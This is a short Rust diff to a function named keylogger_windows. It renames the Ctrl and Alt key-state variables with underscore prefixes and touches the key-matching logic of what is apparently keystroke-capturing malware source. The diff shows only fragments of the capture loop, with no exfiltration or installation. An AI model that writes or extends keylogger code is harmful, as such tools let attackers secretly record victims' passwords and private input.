@@ -295,8 +295,8 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
     while running.load(Ordering::SeqCst) {
         let mut caps_lock = false;
         let mut shift_pressed = false;
-        let mut ctrl_pressed = false;
-        let mut alt_pressed = false;
+        let mut _ctrl_pressed = false;
+        let mut _alt_pressed = false;
 
         let mut key_state: [u8; 256] = [0; 256];
         unsafe {
@@ -326,11 +326,11 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
                         continue;
                     }
                     VK_CONTROL => {
-                        ctrl_pressed = true;
+                        _ctrl_pressed = true;
                         continue;
                     }
                     VK_MENU => {
-                        alt_pressed = true;
+                        _alt_pressed = true;
                         continue;
                     }
                     VK_LWIN | VK_RWIN => {
@@ -353,8 +353,8 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
 
             match vk as i32 {
                 VK_SHIFT => shift_pressed = is_pressed,
-                VK_CONTROL => ctrl_pressed = is_pressed,
-                VK_MENU => alt_pressed = is_pressed,
+                VK_CONTROL => _ctrl_pressed = is_pressed,
+                VK_MENU => _alt_pressed = is_pressed,
                 _ => {}
             }
 
